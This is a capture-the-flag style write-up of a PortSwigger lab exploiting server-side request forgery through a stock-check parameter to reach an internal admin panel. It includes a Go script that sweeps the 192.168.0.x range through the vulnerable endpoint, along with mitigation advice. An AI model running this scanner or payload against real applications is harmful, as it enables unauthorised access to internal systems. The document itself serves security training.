## Basic SSRF Against Another Back-End System

### Overview

Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain or IP address chosen by the attacker. This can lead to unauthorized access to internal systems, bypassing firewalls and network segmentation.

In this demonstration, we exploit an SSRF vulnerability in a stock checking feature of an e-commerce application. The application fetches stock information from a user-supplied URL without proper validation, allowing us to access internal administrative panels.

### Root Cause

- Lack of input validation and whitelist enforcement on the `stockApi` URL parameter.
- Internal back-end systems (e.g., admin panels) are accessible from the application server without authentication.
- Trust relationship between the front-end application and internal services, assuming server-initiated requests are safe.

### Impact

Successful exploitation can lead to:
- Unauthorized access to internal network resources.
- Exposure of sensitive administrative interfaces.
- Potential for further attacks like reading local files or pivoting to other internal services.
- Data leakage or manipulation in connected systems.

### Exploitation

#### Step 1: Initial Request Analysis
Upon clicking the "Check stock" button on the product details page, the application sends a POST request to `/product/stock` with the `stockApi` parameter. This parameter contains a URL that the server uses to fetch stock information.

<img width="1358" height="681" alt="image" src="https://github.com/user-attachments/assets/bb9a7fea-4efc-4641-b776-780abdfab310" />
<img width="1354" height="682" alt="image" src="https://github.com/user-attachments/assets/2842f73e-231f-476f-9bf3-54feb797c37e" />

<p align="center"></i></p>
<br><br>

#### Step 2: Decoding the URL
The `stockApi` parameter is URL-encoded. Decoding it reveals the internal endpoint being accessed: `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`. This confirms that the application is fetching data from an internal system.

<img width="1029" height="635" alt="image" src="https://github.com/user-attachments/assets/7067fb6b-a168-4402-bdf0-6493a8b17c6d" />
<p align="center"></i></p>
<br><br>

#### Step 3: Testing Internal Access
Modifying the IP address in the `stockApi` parameter to `192.168.0.1` results in an HTTP 400 Bad Request response, indicating an invalid or unreachable internal host.

<img width="920" height="615" alt="image" src="https://github.com/user-attachments/assets/22261ed7-83e8-49d4-a788-520957568d14" />
<p align="center"></i></p>
<br><br>

#### Step 4: Identifying Valid Internal IPs
Changing the IP to `192.168.0.12` yields an HTTP 500 Internal Server Error. This status code suggests that the server successfully processed the modified `stockApi` parameter and attempted to connect to the specified internal IP, but the connection failed due to an invalid or unresponsive back-end system.

<img width="1040" height="683" alt="image" src="https://github.com/user-attachments/assets/f724695b-128b-49c1-8c1f-ecacd68f11f1" />
<p align="center"></i></p>
<br><br>

#### Step 5: Automated Scanning
To efficiently identify valid internal IP addresses, a custom Go script was developed to scan the `192.168.0.x` range. The script targets the admin endpoint on port 8080 and checks for non-500 status codes, which indicate successful connections.

The script includes the following key components:

```go
package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

func sendRequest(wg *sync.WaitGroup, targetURL string, sessionCookie string, internalIP string) {
	defer wg.Done()

	// Skip specific IP if needed (e.g., known invalid IPs)
	if internalIP == "192.168.0.1" {
		return
	}

	// Prepare form data for the SSRF payload
	data := url.Values{}
	data.Set("stockApi", fmt.Sprintf("http://%s:8080/admin", internalIP))

	// Create a new POST request
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		fmt.Printf("Error creating request for IP %s: %v\n", internalIP, err)
		return
	}

	// Set headers and cookies manually
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.AddCookie(&http.Cookie{Name: "session", Value: sessionCookie})

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for IP %s: %v\n", internalIP, err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("[*] Trying IP: %-15s\r", internalIP)

	// In this lab, a 500 status typically means the back-end IP was invalid
	if resp.StatusCode != http.StatusInternalServerError {
		fmt.Printf("\n[+] Found valid internal IP address: %s (Status: %d)\n", internalIP, resp.StatusCode)
	}
}

func main() {
	targetURL := "https://0aa60052043637348296b0a1003e00ba.web-security-academy.net/product/stock"
	sessionCookie := "4boavJK6rNCZ0h2is8UeI6ITVpMs082S"

	var wg sync.WaitGroup

	// Scan the 192.168.0.x range
	for i := 0; i < 256; i++ {
		ip := fmt.Sprintf("192.168.0.%d", i)
		wg.Add(1)
		go sendRequest(&wg, targetURL, sessionCookie, ip)
	}

	wg.Wait()
	fmt.Println("\n[*] Scan complete.")
}
```

Execute the script using: `go run ssrf.go`

<img width="1361" height="728" alt="image" src="https://github.com/user-attachments/assets/391e61ec-46fe-477a-983e-8d469eabd05b" />
<p align="center"></i></p>
<br><br>

#### Step 6: Accessing Administrative Functions
Once valid internal IPs are identified, appending `/admin` to the URL allows access to administrative endpoints.

<img width="1032" height="649" alt="image" src="https://github.com/user-attachments/assets/e4cf78ff-f95d-4d1b-ad01-387e5456af39" />
<p align="center"></i></p>
<br><br>

#### Step 7: Retrieving Admin Data
The server successfully fetches and returns data from the internal admin endpoint, demonstrating unauthorized access to sensitive resources.

<img width="503" height="458" alt="image" src="https://github.com/user-attachments/assets/34e5297e-2769-4063-a2f4-ddeaab10e055" />
<p align="center"></i></p>
<br><br>

#### Step 8: Confirming Full Access
The response contains admin panel data, confirming the exploitation's success.

<img width="1014" height="616" alt="image" src="https://github.com/user-attachments/assets/ee3537e9-82c6-43b8-a473-87d2e090ddf7" />
<p align="center"></i></p>
<br><br>

#### Step 9: Lab Completion
The vulnerability exploitation is verified, and the lab is marked as solved.

<img width="1349" height="682" alt="image" src="https://github.com/user-attachments/assets/61c22aba-6644-44ab-af84-177507d347c9" />
<p align="center"></i></p>
<br><br>

### Mitigation

- Implement strict allowlists of permitted domains and IP ranges for URL fetching.
- Block private, reserved, and loopback IP addresses (e.g., 192.168.x.x, 10.x.x.x, 127.0.0.1).
- Use a hardened HTTP client that disables redirects and unsupported schemes.
- Enforce network segmentation to prevent application servers from accessing sensitive internal services.
- Validate and sanitize all user-supplied URLs.
- Use server-side controls to restrict outbound requests.

### Tools and Resources

- **Burp Suite Community Edition**: For intercepting and modifying HTTP requests.
- **Go Programming Language**: For writing custom automation scripts.
- **PortSwigger Web Security Academy**: Lab environment for practicing SSRF vulnerabilities.

### Conclusion

This demonstration highlights the dangers of SSRF vulnerabilities in web applications. Proper input validation and network controls are essential to prevent such attacks. Always follow security best practices when handling user-supplied URLs in server-side code.

Happy (ethical) hacking!
